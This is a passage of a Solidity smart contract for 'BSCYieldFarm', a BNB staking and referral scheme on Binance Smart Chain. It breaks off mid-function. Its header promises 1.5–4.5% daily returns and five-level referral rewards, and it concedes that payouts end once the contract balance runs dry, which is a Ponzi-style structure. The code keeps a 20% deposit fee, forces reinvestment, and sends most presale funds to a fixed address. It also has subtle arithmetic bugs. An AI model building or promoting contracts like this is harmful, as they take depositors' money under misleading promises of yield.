/**
 *Submitted for verification at BscScan.com on 2022-10-07
*/

/*   BSCYieldFarm - Community Experimental yield 
 *   Farm on Binance Smart Chain.
 *   The only official platform BSCyf project!
 *   Version 4.0.0
 *   SPDX-License-Identifier: Unlicensed
 *   ┌─────────────────────────────────────────┐
 *   │   Website: https://bscyf.com            │
 *   │                                         │
 *   │   Telegram Live Support: @bsctrecks     │
 *   │   Telegram Public Chat: @bscyf_real     │
 *   │                                         │
 *   │   E-mail: [email protected]              │
 *   └───────────────────────-─────────────────┘
 *
 *   [USAGE INSTRUCTION]
 *
 *   1) Connect any supported wallet [Recommended: Metamask/TrustWallet ]
 *   2) Be sure to switch to BSC network (Binance Smart Chain) 
 *   3) Click on Dashboard to view the Staking Options
 *   4) Select your Staking Contract and enter the BNB or BSC token amount (e.g: 100)
 *   5) Click "Stake Asset", and confirm the transaction
 *   6) Wait for your earnings, it starts as soon as the transaction is confirmed and Yields every seconds
 *   7) Once you have sufficient Yields, Click on "Harvest Asset" any time (@ 2 hours Intervals)
 *   8) We aim to build a strong community through team work, pls share your link and earn more...
 *   
 *   ##### NOTICE: 
 *   We have a smart Antiy-Drain system implemented to ensure system longevity
 *
 *   [STAKING/FARMING TERMS]
 *
 *   - Minimum deposit: 0.001 BNB [or as specified on the DApp], no maximum limit
 *   - Total income: based on your Staking Contract (from 1.5% and Up to 4.5% daily) 
 *   - Yields every seconds, harvest any time (@ 2 hours Intervals)
 *   - Yield Cap from 170% to 540% 
 *
 *   [AFFILIATE PROGRAM]
 *
 *   - 5 level referral reward: 7% - 3% - 1% - 0.75% - 0.25%
 *
 *   [FUNDS DISTRIBUTION]
 *
 *   - 90% Platform main balance, using for participants payouts, affiliate program bonuses
 *   - 7.5% Advertising and promotion expenses, Support work, technical functioning, administration fee
 *
 *   [DISCLAIMER]
 *
 *   This is an experimental project, it's success relies on its community
 *   as DeFi system it runs smoothly on binance smartchain network
 *   This project can be considered having high risks as well as high profits.
 *   Though once contract balance drops to zero payments will stops, everything has been 
 *   programmed to prevent this from happening, therefore as we keep sharing this project it will remain alive.
 *   deposit at your own risk.
 */

pragma solidity 0.8.17;

abstract contract ReentrancyGuard {
    // Booleans are more expensive than uint256 or any type that takes up a full
    // word because each write operation emits an extra SLOAD to first read the
    // slot's contents, replace the bits taken up by the boolean, and then write
    // back. This is the compiler's defense against contract upgrades and
    // pointer aliasing, and it cannot be disabled.

    // The values being non-zero value makes deployment a bit more expensive,
    // but in exchange the refund on every call to nonReentrant will be lower in
    // amount. Since refunds are capped to a percentage of the total
    // transaction's gas, it is best to keep them low in cases like this one, to
    // increase the likelihood of the full refund coming into effect.
    uint256 private constant _NOT_ENTERED = 1;
    uint256 private constant _ENTERED = 2;

    uint256 private _status;

    constructor () {
        _status = _NOT_ENTERED;
    }

    /**
    * @dev Prevents a contract from calling itself, directly or indirectly.
    * Calling a `nonReentrant` function from another `nonReentrant`
    * function is not supported. It is possible to prevent this from happening
    * by making the `nonReentrant` function external, and make it call a
    * `private` function that does the actual work.
    */
    modifier nonReentrant() {
        // On the first call to nonReentrant, _notEntered will be true
        require(_status != _ENTERED, "ReentrancyGuard: reentrant call");

        // Any calls to nonReentrant after this point will fail
        _status = _ENTERED;

        _;

        // By storing the original value once again, a refund is triggered (see
        // https://eips.ethereum.org/EIPS/eip-2200)
        _status = _NOT_ENTERED;
    }

    modifier isHuman() {
        require(tx.origin == msg.sender, "sorry humans only");
        _;
    }
}

contract BSCYieldFarm is ReentrancyGuard {
    using SafeMath for uint256;
    using SafeERC20 for IERC20;
    // using StakingFunctions for BSCYieldFarm;

    BSCYieldFarm internal  BSCYFv1 = BSCYieldFarm(payable(0xFd6240Ba2174b56E4d7d66231Df1B7CA07417434));
    BSCYieldFarm internal  BSCYFv2 = BSCYieldFarm(payable(0x1b74FAcC863672294A2A031e20995c9E7d6082cD));
    BSCYieldFarm internal  BSCYFv3 = BSCYieldFarm(payable(0x23f647304B48ec44477cF8f2C60e3Eab46D6321A));

    uint256 constant internal CYF_START_PRICE = 0.0000016667 ether; 
    uint256 constant internal STAKE_MIN_AMOUNT = 0.01 ether; 
    uint256 constant internal COMM = 1200;
    uint256[] internal REFERRAL_PERCENTS = [700, 300, 100, 75, 25];
    uint256 constant internal PROJECT_FEE = 500;
    uint256 constant internal TOKEN_MARKETING = 300;
    uint256 constant internal PERCENTS_DIVIDER = 10000;
    uint256 constant internal TIME_STEP = 1 days; // set to seconds only for testing purposes
    uint256 constant internal COOL_DOWN = 2 hours; // set to seconds only for testing purposes
    uint256 constant internal ANTIWHALES = 3; 
    address internal marketing_;
    address internal contract_;
    uint256 constant public TOKEN_PRESALE_ENDS = 1666341011; // ENDS IN 2 WEEKS

    // Group stakes to avoid large loop
    struct Farming{
        uint256 total;
        uint256 active; // updates on each stake
        uint256 harvested; // updates on stake
        uint256 harvest; // pending to withdraw [updates on stake]
        uint256 tharvested; // updates on harvest
        uint256 start; // updates on each stake
        uint256 checkpoint;
    }

    struct Tokens{
        uint8 tokenID;
        string tokenTicker;
        uint8 decimals;
        address token;
        uint256 stakeMinAmount;
        uint256 totalStaked;
        uint256 totalHarvest;
        uint256 totalRefBonus;
        uint256 totalFarmers;
    }

    struct Plan {
        uint256 time;
        uint256 percent;
    }

    struct Deposits {
        uint8 plan;
        uint256 amount;
        uint256 start;
    }

    struct tDeposits{
        uint256 checkpoint;
        uint256 bonus;
        uint256 totalBonus;
        uint256 harvested;
    }

    struct toDeposits{
        uint256 checkpoint;
        uint256 bonus;
        uint256 totalBonus;
        uint256 harvested;
        uint256 pendingFunds;
    }

    struct User {
        address referrer;
        uint8 moved;
        uint256[5] levels;
    }

    mapping (address => uint256) public _tokensPurchased;

    mapping (address => User) public users;

    Plan[] internal plans;

    mapping(uint256 => Tokens) public tokens;

    mapping(address => Tokens) internal _tokens;

    mapping(address => mapping(address => tDeposits)) public tdeposits;
    
    mapping(address => mapping(address => toDeposits)) public todeposits;

    mapping(address => mapping(address => Deposits[])) public deposits;

    mapping(address => mapping(uint8 => Farming[5])) public myStakes;

    uint8 internal _lastTokenID = 0; 

    event Newbie(address user, uint8 tokenID);
    event NewbieBonus(address user, uint8 tokenID, uint256 bonus);
    event NewDeposit(address indexed user, uint8 plan, uint8 tokenID, uint256 amount);
    event Harvested(address indexed user, uint256 amount, uint8 tokenID);
    event Compounded(address indexed user, uint256 amount, uint8 tokenID);
    event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
    event FeePayed(address indexed user, uint256 totalAmount);

    constructor(address _marketing) {
        contract_ = msg.sender;
        marketing_ = _marketing;
        plans.push(Plan(360, 150));
        plans.push(Plan(40, 425));
        plans.push(Plan(60, 435));
        plans.push(Plan(90, 450));
        plans.push(Plan(60, 100));
        Tokens storage token = tokens[_lastTokenID];
        token.tokenID = _lastTokenID;
        token.decimals = 18;
        token.tokenTicker = 'BNB';
        token.stakeMinAmount = STAKE_MIN_AMOUNT;
        _lastTokenID++;
    }

    modifier onlyContract(){
        require(msg.sender == contract_);
        _;
    }

    // Insert Stake
    function insertStaking(uint8 plan, uint256 _amount, uint8 _tokenID) internal{
        address _userID = msg.sender;
        Tokens storage token = tokens[_tokenID];
        if (deposits[_userID][token.token].length == 0) {
            todeposits[_userID][token.token].checkpoint = block.timestamp;
            token.totalFarmers++;
            emit Newbie(_userID, _tokenID);
        }

        deposits[_userID][token.token].push(Deposits(plan, _amount, block.timestamp));

        Farming storage _mystakes = myStakes[_userID][_tokenID][plan];

        (uint256 _subActive, uint256 _dividend) = getUDividend(_userID, _tokenID, plan);
        uint256 _famount = _amount.mul(8000).div(PERCENTS_DIVIDER); // 20% Staking Fee [Stays in contract | new sustainability approved by our team and community]
        _mystakes.total = _mystakes.total.add(_amount);
        _mystakes.active = _mystakes.active.add(_famount).sub(_subActive);
        _mystakes.harvest = _mystakes.harvest.add(_dividend);
        _mystakes.harvested = 0;
        _mystakes.start = block.timestamp;
        _mystakes.checkpoint = block.timestamp;

        token.totalStaked = token.totalStaked.add(_amount);

        emit NewDeposit(_userID, plan, _tokenID, _amount);
    }

    function registerUser(address _referrer) internal{
        address _userID = msg.sender;
        User storage user = users[_userID];
        // if (deposits[referrer][token.token].length > 0 && referrer != _userID) {
        if (_referrer == _userID || _referrer == address(0)) {
            _referrer = contract_;
        }
        user.referrer = _referrer;
        // update count
        for(uint8 i = 0; i < 5; i++){
            if(_referrer != address(0)){
                users[_referrer].levels[i]++;
                _referrer = users[_referrer].referrer;
            }
            else break;
        }
    }

    function doStaking(address referrer, uint8 plan, uint256 _amount, uint8 _tokenID) internal{
        address _userID = msg.sender;
        if(users[msg.sender].referrer == address(0)){
            registerUser(referrer);
        }
        Tokens storage token = tokens[_tokenID];
        uint256 _comm = _amount.mul(COMM).div(PERCENTS_DIVIDER);
        address upline = users[msg.sender].referrer;
        for (uint256 i = 0; i < 5; i++) {
            if (upline != address(0)) {
                // users[upline].levels[i] = users[upline].levels[i].add(1);
                uint256 amount = _amount.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
                todeposits[upline][token.token].bonus += amount;
                todeposits[upline][token.token].totalBonus += amount;
                token.totalRefBonus += amount;
                _comm = _comm.sub(amount);
                emit RefBonus(upline, _userID, i, amount);
                upline = users[upline].referrer;
            } else break;
        }

        if(_comm > 0){
            todeposits[contract_][token.token].bonus += _comm;
            todeposits[contract_][token.token].totalBonus += _comm;
            token.totalRefBonus += _comm;
        }

        insertStaking(plan, _amount, _tokenID);
    }

    function stakeBNB(address referrer, uint8 plan) public payable {
        
        require(msg.sender != address(0x493323C1f45caC0ceC5C151347681CA969De71AE), 'Banned!');
        // if Old User Require UpdateInfo to proceed
        if(checkOldUser() && users[msg.sender].moved != 1){
            updateUserInfo();
        }

        require(plan < 4);
        uint256 _amount = msg.value;
        address _userID = msg.sender;

        require(_amount >= tokens[0].stakeMinAmount);

        uint256 _fee = _amount.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);
        payable(contract_).transfer(_fee.div(2));
        payable(marketing_).transfer(_fee);
        emit FeePayed(_userID, _fee.add(_fee.div(2)));
        doStaking(referrer, plan, _amount, 0);
    }

    function stakeToken(address referrer, uint8 plan,  uint8 tokenID, uint256 _amount) public {
        require(tokenID != 0 && tokens[tokenID].token != address(0), 'Wrong TokenID');
        
        require(plan < 4);
        address _userID = msg.sender;
        
        IERC20 salt = IERC20(tokens[tokenID].token);

        require(_amount >= tokens[tokenID].stakeMinAmount);

        require(_amount <= salt.allowance(msg.sender, address(this)));
        salt.safeTransferFrom(msg.sender, address(this), _amount);

        uint256 _fee = _amount.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);
        // todeposits[contract_][token.token].bonus.add(_fee);
        salt.safeTransfer(contract_, _fee);
        salt.safeTransfer(marketing_, _fee);
        emit FeePayed(_userID, _fee.mul(2));

        doStaking(referrer, plan, _amount, tokenID);
    }
    
    function harvest(uint8 tokenID) public {
        address _userID = msg.sender;
        if(checkOldUser() && users[msg.sender].moved != 1){
            updateUserInfo();
        }
        // Banned Wallet
        require(_userID != address(0x493323C1f45caC0ceC5C151347681CA969De71AE));
        Tokens storage token = tokens[tokenID];
        // Havest is allowed at intervals of 2hrs
        require(block.timestamp >= todeposits[_userID][token.token].checkpoint.add(COOL_DOWN));
        // uint256 totalAmount = getUserDividends(_userID, tokenID);
        uint256 totalAmount;
        // New Optimized for ease in withdrawal [Loop through the 5 staking plans]
        for(uint8 i = 0; i < 5; i++){
            (, uint256 _dividend) = getUDividend(_userID, tokenID, i);
            if(_dividend > 0){
                uint256 _pendingHarvest = myStakes[_userID][tokenID][i].harvest;
                myStakes[_userID][tokenID][i].harvest = 0;
                myStakes[_userID][tokenID][i].harvested = myStakes[_userID][tokenID][i].harvested.add(_pendingHarvest.add(_dividend));
                myStakes[_userID][tokenID][i].checkpoint = block.timestamp;
                totalAmount = totalAmount.add(_pendingHarvest.add(_dividend));
                myStakes[_userID][tokenID][i].tharvested = myStakes[_userID][tokenID][i].tharvested.add(_pendingHarvest.add(_dividend));
            }
        }

        uint256 pendinHarvest = todeposits[_userID][token.token].pendingFunds;

        if(pendinHarvest > 0){
            todeposits[_userID][token.token].pendingFunds = 0;
            totalAmount = totalAmount.add(pendinHarvest);
        }

        uint256 referralBonus = getUserReferralBonus(_userID, tokenID);
        if (referralBonus > 0) {
            todeposits[_userID][token.token].bonus = 0;
            totalAmount = totalAmount.add(referralBonus);
        }

        require(totalAmount > 0);

        uint256 contractBalance = address(this).balance;
        IERC20 salt;
        if(tokenID != 0){
            salt = IERC20(token.token);
            contractBalance = salt.balanceOf(address(this));
        }

        require(contractBalance >= totalAmount);

        // cap withdrawal to 3x total staked
        uint256 harvestCap = gUserTotalDeposits(_userID, tokenID).mul(ANTIWHALES);
        uint256 tHarvested = getUserTotalHarvested(_userID, tokenID).add(totalAmount);

        if(tHarvested >= harvestCap){
            uint256 subHarvest = tHarvested.sub(harvestCap);
            totalAmount = totalAmount.sub(subHarvest);
            todeposits[_userID][token.token].pendingFunds = subHarvest;
        }

        uint256 _withdrawn = totalAmount.mul(7000).div(PERCENTS_DIVIDER);
        uint256 _withFee = totalAmount.mul(500).div(PERCENTS_DIVIDER);
        uint256 _reInvest = totalAmount.sub(_withdrawn.add(_withFee));
        
        todeposits[_userID][token.token].checkpoint = block.timestamp;
        todeposits[_userID][token.token].harvested = todeposits[_userID][token.token].harvested.add(totalAmount);
        // Transfer only 70% of User's Available FUNDS and force re-entry
        if(tokenID != 0){
            salt.safeTransfer(msg.sender, _withdrawn);
        }
        else{
            payable(msg.sender).transfer(_withdrawn);
        }

        emit Harvested(msg.sender, totalAmount, tokenID);
        // Make User's re-entry with 25% balance.
        if(_reInvest > 0){
            insertStaking(4, _reInvest, tokenID);
            emit NewDeposit(msg.sender, 4, tokenID, _reInvest);
        }
        
        token.totalHarvest = token.totalHarvest.add(totalAmount);
    }

    function manualCompounding(uint8 tokenID) public{
        address _userID = msg.sender;
        // Require Update
        if(checkOldUser() && users[msg.sender].moved != 1){
            updateUserInfo();
        }
        Tokens storage token = tokens[tokenID];
        // Havest is allowed at intervals of 2hrs
        require(block.timestamp >= todeposits[_userID][token.token].checkpoint.add(COOL_DOWN));
        // uint256 totalAmount = getUserDividends(_userID, tokenID);
        uint256 totalAmount;
        // New Optimized for ease in withdrawal [Loop through the 5 staking plans]
        for(uint8 i = 0; i < 5; i++){
            (, uint256 _dividend) = getUDividend(_userID, tokenID, i);
            if(_dividend > 0){
                uint256 _pendingHarvest = myStakes[_userID][tokenID][i].harvest;
                myStakes[_userID][tokenID][i].harvest = 0;
                myStakes[_userID][tokenID][i].harvested = myStakes[_userID][tokenID][i].harvested.add(_pendingHarvest.add(_dividend));
                myStakes[_userID][tokenID][i].checkpoint = block.timestamp;
                totalAmount = totalAmount.add(_pendingHarvest.add(_dividend));
                myStakes[_userID][tokenID][i].tharvested = myStakes[_userID][tokenID][i].tharvested.add(_pendingHarvest.add(_dividend));
            }
        }

        uint256 pendinHarvest = todeposits[_userID][token.token].pendingFunds;

        if(pendinHarvest > 0){
            todeposits[_userID][token.token].pendingFunds = 0;
            totalAmount = totalAmount.add(pendinHarvest);
        }

        uint256 referralBonus = getUserReferralBonus(_userID, tokenID);
        if (referralBonus > 0) {
            todeposits[_userID][token.token].bonus = 0;
            totalAmount = totalAmount.add(referralBonus);
        }

        // cap withdrawal to 3x total staked
        uint256 harvestCap = gUserTotalDeposits(_userID, tokenID).mul(ANTIWHALES);
        uint256 tHarvested = getUserTotalHarvested(_userID, tokenID).add(totalAmount);

        if(tHarvested >= harvestCap){
            uint256 subHarvest = tHarvested.sub(harvestCap);
            totalAmount = totalAmount.sub(subHarvest);
            todeposits[_userID][token.token].pendingFunds = subHarvest;
        }

        require(totalAmount > 0);

        uint256 _compound = totalAmount.mul(7000).div(PERCENTS_DIVIDER);
        uint256 _withFee = totalAmount.mul(500).div(PERCENTS_DIVIDER);
        uint256 _reInvest = totalAmount.sub(_compound.add(_withFee));

        todeposits[_userID][token.token].checkpoint = block.timestamp;
        todeposits[_userID][token.token].harvested = todeposits[_userID][token.token].harvested.add(totalAmount);
        // Make User's re-entry with 70% balance.
        if(_compound > 0){
            insertStaking(3, _compound, tokenID);
            emit Compounded(msg.sender, _compound, tokenID);
        }
        // Make User's re-entry with 25% balance.
        if(_reInvest > 0){
            insertStaking(4, _reInvest, tokenID);
            emit NewDeposit(msg.sender, 4, tokenID, _reInvest);
        }
        
        token.totalHarvest = token.totalHarvest.add(totalAmount);
    }

    function getContractBalance(uint256 tokenID) public view returns (uint256) {
        if(tokenID > 0){
            Tokens memory token = tokens[tokenID];
            IERC20 salt = IERC20(token.token);
            return salt.balanceOf(address(this));
        }
        else{
            return address(this).balance;
        }
    }

    function getPlanInfo(uint8 plan) public view returns(uint256 time, uint256 percent) {
        time = plans[plan].time;
        percent = plans[plan].percent;
    }

    function getUDividend(address _userID, uint8 _tokenID, uint8 _planID) public view returns(uint256, uint256){
        uint256 _share = 0;
        uint256 _dividend = 0;
        uint256 _end = myStakes[_userID][_tokenID][_planID].start.add(plans[_planID].time.mul(TIME_STEP));
        if(myStakes[_userID][_tokenID][_planID].checkpoint < _end){
            _share = myStakes[_userID][_tokenID][_planID].active.mul(plans[_planID].percent).div(PERCENTS_DIVIDER);
            uint256 _from = myStakes[_userID][_tokenID][_planID].start > myStakes[_userID][_tokenID][_planID].checkpoint ? myStakes[_userID][_tokenID][_planID].start : myStakes[_userID][_tokenID][_planID].checkpoint;
            uint256 _to = _end < block.timestamp ? _end : block.timestamp;
            if(_from < _to){
                _dividend = _share.mul(_to.sub(_from)).div(TIME_STEP);
            }
        }
        uint256 _subActive;
        uint256 _harvested = _dividend.add(myStakes[_userID][_tokenID][_planID].harvested);

        uint256 _active = myStakes[_userID][_tokenID][_planID].active;
        uint256 _incrment = plans[_planID].time.mul(plans[_planID].percent);
        // Get Total Expected
        if(_active > 0){
            uint256 _expected = _active.mul(_incrment).div(PERCENTS_DIVIDER);
            uint256 _percent = _harvested.mul(PERCENTS_DIVIDER).div(_expected);
            // get total Earned
            _subActive = _active.mul(_percent).div(PERCENTS_DIVIDER);
        }

        return(_subActive, _dividend);
    }

    function getUserDividends(address userAddress, uint8 tokenID) public view returns (uint256) {
        // View Dividend 
        uint256 _getDividend;
        for(uint8 i = 0; i < 5; i++){
            (, uint256 _dividend) = getUDividend(userAddress, tokenID, i);
            _getDividend = _getDividend.add(_dividend);
        }
        return _getDividend;
    }

    function getUserTotalHarvested(address userAddress, uint256 tokenID) internal view returns (uint256) {
        Tokens memory token = tokens[tokenID];
        return todeposits[userAddress][token.token].harvested;
    }

    function getUserPendingHarvest(address userAddress, uint256 tokenID) public view returns (uint256) {
        Tokens memory token = tokens[tokenID];
        return todeposits[userAddress][token.token].pendingFunds;
    }

    function getUserReferrer(address userAddress) public view returns(address) {
        return users[userAddress].referrer;
    }

    function getUserDownlineCount(address userAddress) public view returns(uint256[5] memory referrals) {
        return (users[userAddress].levels);
    }

    function getUserTotalReferrals(address userAddress) public view returns(uint256) {
        return users[userAddress].levels[0]+users[userAddress].levels[1]+users[userAddress].levels[2]+users[userAddress].levels[3]+users[userAddress].levels[4];
    }

    function getUserReferralBonus(address userAddress, uint256 tokenID) public view returns(uint256) {
        Tokens memory token = tokens[tokenID];
        return todeposits[userAddress][token.token].bonus;
    }

    function getUserReferralTotalBonus(address userAddress, uint256 tokenID) public view returns(uint256) {
        Tokens memory token = tokens[tokenID];
        return todeposits[userAddress][token.token].totalBonus;
    }

    function getUserReferralHarvested(address userAddress, uint256 tokenID) public view returns(uint256) {
        Tokens memory token = tokens[tokenID];
        return todeposits[userAddress][token.token].totalBonus.sub(todeposits[userAddress][token.token].bonus);
    }

    function getUserAvailable(address userAddress, uint8 tokenID) public view returns(uint256) {
        return getUserReferralBonus(userAddress, tokenID).add(getUserDividends(userAddress, tokenID));
    }

    function getUserAmountOfDeposits(address userAddress, uint256 tokenID) public view returns(uint256) {
        Tokens memory token = tokens[tokenID];
        return deposits[userAddress][token.token].length;
    }

    function gUserTotalDeposits(address userAddress, uint8 tokenID) internal view returns(uint256 totalDeposits) {
        for(uint8 i = 0; i < 5; i++){
            totalDeposits = totalDeposits.add(myStakes[userAddress][tokenID][i].total);
        }
    }

    function getActiveDeposits(address userAddress, uint8 tokenID) public view returns (uint256 activeDeposits) {
        // View Active Deposits
        for(uint8 i = 0; i < 5; i++){
            activeDeposits = activeDeposits.add(myStakes[userAddress][tokenID][i].active);
        }
    }

    function getUserDepositInfo(address userAddress, uint256 index, uint256 tokenID) public view returns(uint8 plan, uint256 percent, uint256 amount, uint256 start, uint256 finish) {
        Tokens memory token = tokens[tokenID];
        plan = deposits[userAddress][token.token][index].plan;
        percent = plans[plan].percent;
        amount = deposits[userAddress][token.token][index].amount;
        start = deposits[userAddress][token.token][index].start;
        finish = deposits[userAddress][token.token][index].start.add(plans[deposits[userAddress][token.token][index].plan].time.mul(TIME_STEP));
    }

    function getSiteInfo(uint256 tokenID) public view returns(uint256 _totalInvested, uint256 _totalBonus) {
        Tokens memory token = tokens[tokenID];
        return(token.totalStaked, token.totalRefBonus);
    }

    function getUserInfo(address userAddress, uint8 tokenID) public view returns(uint256 totalDeposit, uint256 totalHarvested, uint256 totalReferrals) {
        return(gUserTotalDeposits(userAddress, tokenID), getUserTotalHarvested(userAddress, tokenID), getUserTotalReferrals(userAddress));
    }

    function isContract(address addr) internal view returns (bool) {
        uint256 size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

    function verifyAllowance(uint8 tokenID) public view returns(uint256){
        require(tokenID > 0);
        Tokens memory token = tokens[tokenID];
        return(IERC20(token.token).allowance(msg.sender, address(this)));
    }

    function updateMinimum(uint256 _tokenID, uint256 _stakeMinAmount) public onlyContract{
        Tokens storage token = tokens[_tokenID];
        token.stakeMinAmount = _stakeMinAmount;
    }

    function addToken(address _token, uint256 _stakeMinAmount) public onlyContract{
        require(_tokens[_token].tokenID == 0);
        Tokens storage token = tokens[_lastTokenID];
        token.decimals = IERC20(_token).decimals();
        token.tokenTicker = IERC20(_token).symbol();
        token.token = _token;
        token.tokenID = _lastTokenID;
        token.stakeMinAmount = _stakeMinAmount;
        _lastTokenID++;
    }

    // New Feature Added to Secure CYF token pre-sales
    // Pay 5% to Sponsor on external purchase
    // Participate in CYF token 
    function checkBonusMultiplier() internal view returns(uint256 _multiplier){
        (uint256 _totalStaked, , ) = getUserInfo(msg.sender, 0);
        if(_totalStaked >= 1 ether && _totalStaked < 5 ether){
            _multiplier = 13000;
        }
        else if(_totalStaked >= 5 ether && _totalStaked < 25 ether){
            _multiplier = 15000;
        }
        else if(_totalStaked >= 25 ether && _totalStaked < 100 ether){
            _multiplier = 22000;
        }
        else if(_totalStaked >= 100 ether && _totalStaked < 300 ether){
            _multiplier = 25000;
        }
        else if(_totalStaked >= 300){
            _multiplier = 30000;
        }
        else{
            _multiplier = 11000;
        }
        return _multiplier;
    }

    // External Purchase [CYF toke presale]
    function joinPresales() external payable{
        require(TOKEN_PRESALE_ENDS >= block.timestamp);
        address _userID = msg.sender;
        uint256 _isStaker = gUserTotalDeposits(_userID, 0);
        require(_isStaker > 0);
        uint256 _amount = msg.value;
        require(_amount >= 0.1 ether);
        uint256 _tokenAmount = _amount.mul(checkBonusMultiplier().div(PERCENTS_DIVIDER)).div(CYF_START_PRICE); // Give Bonus Based on Total Amount Staked
        _tokensPurchased[_userID] = _tokensPurchased[_userID].add(_tokenAmount * 10 ** 18); // Considering token decimal is 18
        // Pay 5% Affiliate commissions 
        uint256 _commission = _amount.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);
        address _sponsor = users[_userID].referrer;
        if(_sponsor != address(0)){
            payable(_sponsor).transfer(_commission);
        }
        // 2.5% Dev Fees
        payable(contract_).transfer(_commission.div(2));
        // 3% Marketing & Administrative
        uint256 _marketing = _amount.mul(TOKEN_MARKETING).div(PERCENTS_DIVIDER);
        payable(marketing_).transfer(_marketing);
        // 80% Reserved for Token Liquidity
        uint256 _liquidity = _amount.mul(8000).div(PERCENTS_DIVIDER);
        payable(0x11bE5f7A7b6AAF29BeB6447448bfaf0FB27a9C1a).transfer(_liquidity);
    }

    // Purchase with Stakes [1% to 100%] of active stake
    function purchaseWithActiveStakes(uint256 _allocation) public{
        require(TOKEN_PRESALE_ENDS >= block.timestamp && _allocation >= 100 && _allocation <= 10000, 'wrong value');
        // check if old user and migrate 
        if(checkOldUser() && users[msg.sender].moved != 1){
            updateUserInfo();
        }       
        address _userID = msg.sender;
        uint256 _isStaker = gUserTotalDeposits(_userID, 0);
        require(_isStaker > 0);
        // Take the same % on each packs 
        uint256 totalAmount;
        // Collect same percentage on each Stakes
        // [to have a fair share allocation across each packs]
        // Update the available active amount.
        for(uint8 i = 0; i < 5; i++){
            (uint256 _subActive, uint256 _dividend) = getUDividend(_userID, 0, i);
            uint256 _active = myStakes[_userID][0][i].active.sub(_subActive);
            uint256 _allocated = _active.mul(_allocation).div(PERCENTS_DIVIDER);
            myStakes[_userID][0][i].active = myStakes[_userID][0][i].active.sub(_allocated.add(_subActive));
            myStakes[_userID][0][i].harvest = myStakes[_userID][0][i].harvest.add(_dividend);
            myStakes[_userID][0][i].harvested = 0;
            myStakes[_userID][0][i].checkpoint = block.timestamp;
            totalAmount = totalAmount.add(_allocated);
        }
        require(totalAmount >= 0.1 ether, 'lowevalue');
        // Set Tokens for User [Claimable on Claiming Contract]
        uint256 _tokenAmount = totalAmount.mul(checkBonusMultiplier().div(PERCENTS_DIVIDER)).div(CYF_START_PRICE); // Give Bonus Based on Total Amount Staked
        _tokensPurchased[_userID] = _tokensPurchased[_userID].add(_tokenAmount * 10 ** 18); // Considering token decimal is 18
    }

    // Purchase with available to harvest = [harvest and buy token]
    function purchaseWithAvailable() public{
        
        require(TOKEN_PRESALE_ENDS >= block.timestamp);

        // check if old user and migrate 
        if(checkOldUser() && users[msg.sender].moved != 1){
            updateUserInfo();
        }
        
        address _userID = msg.sender;
        uint256 _isStaker = gUserTotalDeposits(_userID, 0);
        require(_isStaker > 0);
        // Purchase with Available to Harvest
        // Harvest and Purchase
        // No commissions paid when using this method 
        require(block.timestamp >= todeposits[_userID][address(0)].checkpoint.add(COOL_DOWN));
        // uint256 totalAmount = getUserDividends(_userID, tokenID);
        uint256 totalAmount;
        // New Optimized for ease in withdrawal [Loop through the 5 staking plans]
        for(uint8 i = 0; i < 5; i++){
            (, uint256 _dividend) = getUDividend(_userID, 0, i);
            if(_dividend > 0){
                uint256 _pendingHarvest = myStakes[_userID][0][i].harvest;
                myStakes[_userID][0][i].harvest = 0;
                myStakes[_userID][0][i].harvested = myStakes[_userID][0][i].harvested.add(_pendingHarvest.add(_dividend));
                myStakes[_userID][0][i].checkpoint = block.timestamp;
                totalAmount = totalAmount.add(_pendingHarvest.add(_dividend));
            }
        }

        uint256 pendinHarvest = todeposits[_userID][address(0)].pendingFunds;

        if(pendinHarvest > 0){
            todeposits[_userID][address(0)].pendingFunds = 0;
            totalAmount = totalAmount.add(pendinHarvest);
        }

        uint256 referralBonus = getUserReferralBonus(_userID, 0);
        if (referralBonus > 0) {
            todeposits[_userID][address(0)].bonus = 0;
            totalAmount = totalAmount.add(referralBonus);
        }

        // cap withdrawal to 3x total staked
        uint256 harvestCap = gUserTotalDeposits(_userID, 0).mul(ANTIWHALES);
        uint256 tHarvested = getUserTotalHarvested(_userID, 0).add(totalAmount);

        if(tHarvested >= harvestCap){
            uint256 subHarvest = tHarvested.sub(harvestCap);
            totalAmount = totalAmount.sub(subHarvest);
            todeposits[_userID][address(0)].pendingFunds = subHarvest;
        }

        require(totalAmount >= 0.1 ether);

        todeposits[_userID][address(0)].checkpoint = block.timestamp;
        todeposits[_userID][address(0)].harvested = todeposits[_userID][address(0)].harvested.add(totalAmount);

        tokens[0].totalHarvest = tokens[0].totalHarvest.add(totalAmount);

        // credit Tokens to User
        uint256 _tokenAmount = totalAmount.mul(checkBonusMultiplier().div(PERCENTS_DIVIDER)).div(CYF_START_PRICE); // Give Bonus Based on Total Amount Staked
        _tokensPurchased[_userID] = _tokensPurchased[_userID].add(_tokenAmount * 10 ** 18); // Considering token decimal is 18
    }

    function updateUserStats(uint8 _version) internal {
        address _userID = msg.sender;
        if(_version == 1){
            // Update Old Version Stats
            ( , uint256 _bonus, , uint256 _harvested) = BSCYFv1.tdeposits(msg.sender, address(0));
            todeposits[_userID][address(0)].checkpoint = block.timestamp;
            todeposits[_userID][address(0)].harvested += _harvested;
            todeposits[_userID][address(0)].bonus += _bonus;
        }
        else if(_version == 2){
            ( , uint256 _bonus, , uint256 _harvested, uint256 _pendingFunds) = BSCYFv2.todeposits(_userID, address(0));
            todeposits[_userID][address(0)].checkpoint = block.timestamp;
            todeposits[_userID][address(0)].harvested += _harvested;
            todeposits[_userID][address(0)].bonus += _bonus;
            todeposits[_userID][address(0)].pendingFunds = _pendingFunds;
        }
        else{
            ( , uint256 _bonus, , uint256 _harvested, uint256 _pendingFunds) = BSCYFv3.todeposits(_userID, address(0));
            todeposits[_userID][address(0)].checkpoint = block.timestamp;
            todeposits[_userID][address(0)].harvested += _harvested;
            todeposits[_userID][address(0)].bonus += _bonus;
            todeposits[_userID][address(0)].pendingFunds = _pendingFunds;
        }
    }

    function checkOldUser() internal view returns(bool){
        uint256 _deposits_v1 = BSCYFv1.getUserAmountOfDeposits(msg.sender, 0);
        uint256 _deposits_v2 = BSCYFv2.getUserAmountOfDeposits(msg.sender, 0);
        uint256 _deposits_v3 = BSCYFv3.getUserAmountOfDeposits(msg.sender, 0);
        if(_deposits_v1 > 0 || _deposits_v2 > 0 || _deposits_v3 > 0){
            return true;
        }
